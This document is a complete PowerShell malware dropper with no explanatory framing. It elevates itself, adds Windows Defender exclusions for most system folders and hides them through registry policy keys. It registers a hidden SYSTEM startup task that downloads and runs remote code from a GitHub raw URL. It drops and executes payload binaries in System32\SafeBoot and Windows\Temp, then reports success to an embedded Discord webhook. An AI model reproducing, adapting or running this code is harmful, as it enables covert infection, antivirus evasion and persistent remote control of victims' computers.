# --------- #
# VARIABLES 
# --------- #
$install_path = "C:\Windows\System32\SafeBoot\winio.exe"
$install_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/c"
$update_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/u"
$webhook_url = "1305333146228752536/iggbztKYTfK72bjEd5r0C93T2vksQIkt1x_hXpHfg9A_JXBk8gKNMyTPUsE1myRNPH4y"

# ------------------------------ #
# HIDE CURRENTLY SELECTED WINDOW
# ------------------------------ # 
Add-Type -TypeDefinition @"
using System; 
using System.Runtime.InteropServices; 
public class WindowHelper 
{ 
    [DllImport("user32.dll")] 
    public static extern IntPtr GetForegroundWindow(); 

    [DllImport("user32.dll")] 
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 

    public const int SW_HIDE = 0; 
    public static void HideWindow() 
    { 
        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
    }
}
"@; 
#[WindowHelper]::HideWindow();

# ------------------------------------ #
# CHECK IF PROCESS IS RUNNING AS ADMIN
# ------------------------------------ #
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    $newProc = Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr '" + $install_url + "' -UseBasicP)") -Verb RunAs -PassThru;
    $newProc.WaitForExit();
    exit;
}

# ------------------------------------------- #
# ADD EXCLUSIONS TO WINDOWS DEFENDER REGISTRY
# ------------------------------------------- #
$paths = @(
    "C:\Program Files\Windows Defender",
    "C:\Program Files\Windows Defender Advanced Threat Protection",
    "C:\Program Files\Windows NT",
    "C:\Program Files\Windows Security",
    "C:\Program Files\WindowsPowerShell",

    "C:\Program Files (x86)\Internet Explorer",
    "C:\Program Files (x86)\Microsoft",
    "C:\Program Files (x86)\Windows Defender",
    "C:\Program Files (x86)\Windows NT",
    "C:\Program Files (x86)\WindowsPowerShell",

    "C:\Windows\Boot",
    "C:\Windows\SafeBoot",
    "C:\Windows\CSC",
    "C:\Windows\debug",
    "C:\Windows\diagnostics",
    "C:\Windows\Logs",
    "C:\Windows\PLA",
    "C:\Windows\Resources",
    "C:\Windows\security",
    "C:\Windows\System",
    "C:\Windows\System32",
    "C:\Windows\SystemApps",
    "C:\Windows\SystemResources",
    "C:\Windows\SystemTemp",
    "C:\Windows\SysWOW64",
    "C:\Windows\Tasks",
    "C:\Windows\WinSxS",
    "C:\Windows\Temp",
    
    "$env:LOCALAPPDATA\Temp"
)

foreach ($path in $paths) {
    try {
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    } catch {
        # HANDLE ERRORS
    }
}

# ----------------------------------- #
# HIDE EXCLUSIONS IN WINDOWS SETTINGS
# ----------------------------------- #
$keys = @(
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusionsFromLocalAdmins",
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusions"
)
    
foreach ($key in $keys) 
{
    try {
        if (-not (Test-Path $key -ErrorAction SilentlyContinue)) {
            New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
            New-ItemProperty -Path $key -Name "Default" -Value 1 -PropertyType "DWORD" -Force -ErrorAction SilentlyContinue | Out-Null
        } else {
            Set-ItemProperty -Path $key -Name "Default" -Value 1 -Force -ErrorAction SilentlyContinue
        }
    } catch {
        # HANDLE ERRORS
    }
}

# --------------------------------- #
# CREATE SCHEDULED TASK
# --------------------------------- #
# Ensure correct task creation cmdlets are available
if (-not (Get-Command "New-ScheduledTask" -ErrorAction SilentlyContinue)) {
    Write-Host "Scheduled Task cmdlets are not available. Ensure you are running PowerShell with the necessary permissions." -ForegroundColor Red
    exit
}

# Action: Powershell script
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command iex (iwr '$install_url' -UseBasicP)"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -WakeToRun

# Create and Register Task
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
Register-ScheduledTask -TaskName "CustomScheduledTask" -InputObject $task -Force

Write-Host "Scheduled task created and registered successfully."

# ------------------------- #
# DOWNLOAD AND EXECUTE FILES
# ------------------------- #
try {
    Invoke-WebRequest -Uri $install_url -OutFile $install_path -ErrorAction Stop
    Start-Process -FilePath $install_path -NoNewWindow -Wait
} catch {
    Write-Host "Error downloading or executing the install file: $_" -ForegroundColor Red
}

# --------------------------------------- #
# UPDATE CHECK AND EXECUTION
# --------------------------------------- #
try {
    Invoke-WebRequest -Uri $update_url -OutFile "C:\Windows\Temp\update.exe" -ErrorAction Stop
    Start-Process -FilePath "C:\Windows\Temp\update.exe" -NoNewWindow -Wait
} catch {
    Write-Host "Error downloading or executing the update file: $_" -ForegroundColor Red
}

# ----------------------- #
# FINAL WEBHOOK NOTIFY
# ----------------------- #
try {
    Invoke-WebRequest -Uri "https://discord.com/api/webhooks/$webhook_url" -Method POST -Body '{"content": "Installation and update process complete."}' -ContentType "application/json" -ErrorAction Stop
} catch {
    Write-Host "Error sending webhook notification: $_" -ForegroundColor Red
}
